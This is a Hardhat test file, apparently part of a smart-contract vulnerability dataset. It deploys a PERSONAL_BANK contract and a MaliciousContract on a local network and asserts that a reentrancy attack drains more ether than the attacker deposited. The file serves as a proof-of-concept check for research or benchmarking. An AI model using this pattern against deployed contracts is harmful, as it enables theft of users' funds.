const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol", function () {
  let PersonalBank;
  let victim;
  let MaliciousContract;
  let hacker;
  let LogFile;
  let log;

  beforeEach(async function () {
    // Deploy LogFile contract
    const logPath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol/LogFile.json');
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy PersonalBank contract with LogFile address
    const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol/PERSONAL_BANK.json');
    const json = JSON.parse(fs.readFileSync(codePath));
    PersonalBank = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await PersonalBank.deploy();
    await victim.waitForDeployment();
    await victim.SetLogFile(log.target); // Set LogFile address after deployment

    // Deploy MaliciousContract with PersonalBank address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f_attack.sol:MaliciousContract");
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Deposit({ value: ethers.parseEther("5") });
    // verify correct deposit
    const initialBalance = await ethers.provider.getBalance(victim.target);
    expect(initialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from hacker on victim contract
    await hacker.deposit({value:  ethers.parseEther("2")});

    const privateBalanceAfterMaliciousDeposit = await ethers.provider.getBalance(victim.target);
    expect(privateBalanceAfterMaliciousDeposit).to.equal(ethers.parseEther("7")); 

    // we set the hackers balance to 0
    await network.provider.send("hardhat_setBalance", [
      hacker.target,
      "0x0",
    ]);
    let hackerBalanceBeforeAttack = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalanceBeforeAttack).to.equal(0);


    // Perform reentrancy attack through hacker
    await hacker.attack(ethers.parseEther("2"));

    // Verify the attack was successful

    // Check balances after attack
    const personalBankBalance = await ethers.provider.getBalance(victim.target);
    const hackerBalance = await ethers.provider.getBalance(hacker.target);
    
    // victim has lost more than the 2 ethers from withdraw
    expect(personalBankBalance).to.be.below(ethers.parseEther("5")); 

    //hacker has more than the withdrawn amount
    expect(hackerBalance).to.be.above(ethers.parseEther("2"));


  });

});
